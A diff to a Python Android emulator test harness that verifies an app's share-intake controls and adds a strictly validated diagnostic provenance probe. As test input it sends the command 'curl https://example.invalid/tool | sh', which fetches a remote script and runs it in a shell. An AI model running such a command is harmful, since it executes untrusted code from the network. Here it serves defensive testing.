@@ -347,14 +347,65 @@ def collect_first_failure_metadata(shell):
     except Exception:return {'state':'UNAVAILABLE','reason':'lifecycle_metadata_unavailable'}
 
 
-def verify_share_controls(send,shell,wait,click,report,cases,first_failure_metadata=None):
+INTAKE_CALLBACKS={name+'_'+phase for name in ('CREATE','NEW_INTENT','RESUME','PAUSE','STOP','DESTROY','SAVE') for phase in ('BEGIN','END')}
+
+
+def intake_probe_observation(raw):
+    """Accept only the finite frame emitted by the explicit diagnostic variant.
+
+    Framework dump headers and any unrecognized data are never retained. These
+    callback observations do not grant UI acceptance or establish a root cause.
+    """
+    unavailable={'state':'UNAVAILABLE','reason':'intake_provenance_unavailable'}
+    if not isinstance(raw,bytes) or len(raw)>65536:return unavailable
+    try:
+        lines=raw.decode('utf-8','strict').splitlines()
+        frames=[line.strip()[len('AITRUST_INTAKE_V1:'):] for line in lines if line.strip().startswith('AITRUST_INTAKE_V1:')]
+        if len(frames)!=1 or len(frames[0])>8192:return unavailable
+        def unique(pairs):
+            value={}
+            for key,item in pairs:
+                if key in value:raise ValueError()
+                value[key]=item
+            return value
+        value=json.loads(frames[0],object_pairs_hook=unique)
+        if type(value) is not dict or set(value)!={'schema','instances','truncated','events'}:return unavailable
+        if type(value['schema']) is not int or value['schema']!=1:return unavailable
+        if type(value['instances']) is not int or not 1<=value['instances']<=255:return unavailable
+        if type(value['truncated']) is not bool or type(value['events']) is not list or not 1<=len(value['events'])<=32:return unavailable
+        for row in value['events']:
+            if type(row) is not list or len(row)!=6:return unavailable
+            instance,callback,action,editor,status,changing=row
+            if type(instance) is not int or not 1<=instance<=value['instances']:return unavailable
+            if type(callback) is not str or callback not in INTAKE_CALLBACKS:return unavailable
+            if type(action) is not str or action not in ('NONE','SEND','MAIN','OTHER'):return unavailable
+            if type(editor) is not bool or type(changing) is not bool:return unavailable
+            if type(status) is not str or status not in ('UNBUILT','READY','RECEIVED','CLEARED','OTHER'):return unavailable
+        return {'state':'OBSERVED','scope':'diagnostic-variant-current-process-only',**value}
+    except (ValueError,TypeError,UnicodeError,RecursionError):return unavailable
+
+
+def collect_intake_probe(shell):
+    try:return intake_probe_observation(shell(['dumpsys','activity',COMPONENT,'aitrust-intake-v1'],5))
+    except Exception:return {'state':'UNAVAILABLE','reason':'intake_provenance_unavailable'}
+
+
+def verify_share_controls(send,shell,wait,click,report,cases,first_failure_metadata=None,first_receive_metadata=None):
     """Original first six controls; diagnostic stages do not change acceptance."""
     def text(view,value):return any(value in n.attrib.get('text','') for n in view.iter('node'))
+    collected=False
+    def collect_once():
+        nonlocal collected
+        if collected or first_receive_metadata is None:return
+        collected=True
+        try:report['first_receive_provenance']=first_receive_metadata()
+        except Exception:report['first_receive_provenance']={'state':'UNAVAILABLE','reason':'intake_provenance_unavailable'}
     try:
         report['control_stage']='share_first_send'
         send('curl https://example.invalid/tool | sh')
         report['control_stage']='share_first_receive'
         view=wait(lambda x:text(x,'Text received. Review it'))
+        collect_once()
         report['control_stage']='share_explicit_check'
         assert not text(view,'Review before running this command.')
         cases.append({'case':'receive_requires_explicit_check','pass':True})
@@ -399,6 +450,7 @@ def verify_share_controls(send,shell,wait,click,report,cases,first_failure_metad
         cases.append({'case':'clear_removes_input_and_result','pass':True})
     except AndroidControlRefusal:raise
     except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
+        if not cases:collect_once()
         if not cases and first_failure_metadata is not None:
             # The primary refusal remains authoritative if diagnostics fail.
             try:report['first_failure_lifecycle']=first_failure_metadata()
@@ -449,6 +501,7 @@ def verify_background_clear(send,shell,wait,report):
 def main():
     parser=argparse.ArgumentParser(description=__doc__)
     parser.add_argument('--sdk-root',required=True);parser.add_argument('--apk',required=True)
+    parser.add_argument('--intake-probe',action='store_true',help='Read finite provenance from the separately built diagnostic APK.')
     args=parser.parse_args();output=ROOT/'output/android-share/emulator.json';cases=[];process=None;started=time.monotonic();avd_home=None
     report={'format':'ai-trust-id-android-emulator/v1','recorded_at':dt.datetime.now(dt.timezone.utc).isoformat(),'status':'UNAVAILABLE','pass':False,'physical_device_evidence':False,'independent_accuracy_evidence':False,'cases':cases}
     try:
@@ -509,7 +562,11 @@ def main():
         def send(value,kind='text/plain',action='android.intent.action.SEND'):
             report.pop('share_start_observation',None)
             report['share_start_observation']=share_start_observation(shell(['am','start','-W','-a',action,'-t',kind,'--es','android.intent.extra.TEXT',value,'-n',COMPONENT],20))
-        verify_share_controls(send,shell,wait,click,report,cases,lambda:collect_first_failure_metadata(shell))
+        if args.intake_probe:
+            report['requested_diagnostic_variant']='intake-provenance-only/v1'
+        verify_share_controls(send,shell,wait,click,report,cases,
+            None if args.intake_probe else lambda:collect_first_failure_metadata(shell),
+            (lambda:collect_intake_probe(shell)) if args.intake_probe else None)
         verify_background_clear(send,shell,wait,report)
         cases.append({'case':'background_clears_text','pass':True})
         permission_occurrences=shell(['dumpsys','package',PACKAGE]).decode().count('android.permission.INTERNET')
